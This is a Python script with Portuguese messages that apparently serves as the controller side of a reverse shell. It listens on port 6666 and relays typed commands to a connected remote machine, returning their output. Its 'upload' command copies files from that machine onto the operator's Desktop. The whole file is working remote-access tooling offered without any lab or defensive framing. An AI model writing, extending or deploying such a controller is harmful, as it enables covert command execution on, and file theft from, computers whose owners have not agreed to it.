import socket
import sys
import os

def CreateSocket():
    try:
        global host
        global porta
        global s
        host = socket.gethostbyname(socket.gethostname())
        porta = 6666
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print(f"Erro na criação socket - Socket creation error\n{msg}")
        sys.exit()


def WaitingForConnection():
    try:
        print(f"vinculando o host: ip do server à porta: {porta}")
        s.bind((host, porta))
        print('esperando connecções(Hoje a cobra vai fumar)...')
        s.listen(5)
    except socket.error as msg:
        print(f"Erro Vinculando o host: {host} na porta {porta}. Tentando novamente...(acredite nos seus sonhos um "
              f"dia a cobra vai fumar e vc será lembrado como um FEB) - Error ocurred linking the host: {host} to the "
              f"port:{porta}. Trying again... (Believe in your dreams, One day you'll smoke like a FEB)")
        WaitingForConnection()

def CloseConnection():
    conn, address = s.accept()
    print(f"A cobra vai fumar com o pc de IP:  ip da cliente na porta: {address[1]}")
    SendCommands(conn)
    conn.close()

def SendCommands(conn):
    while True:
        cwdewhoami = conn.recv(1024).decode('utf-8', errors='replace')
        cmd = input(f'{cwdewhoami}')
        if cmd.strip()[:6] == 'upload':
            conn.send(cmd.encode())
            f = open(f'C:\\Users\\{os.getlogin()}\\Desktop\\{cmd[7:]}', 'wb')
            while True:
                bits = conn.recv(1024)
                if bits.decode(errors = 'ignore') == 'END':
                    break
                f.write(bits)
        elif cmd == 'quit':
            conn.send('quit'.encode())
            conn.close()
            s.close()
            sys.exit()
        elif len(str(cmd).encode()) > 0:
            conn.send(str(cmd).encode())
            resposta = conn.recv(1024).decode("utf-8" , errors='replace')
            print(f'{resposta} >', end="")


def main():
    CreateSocket()
    WaitingForConnection()
    CloseConnection()


main()



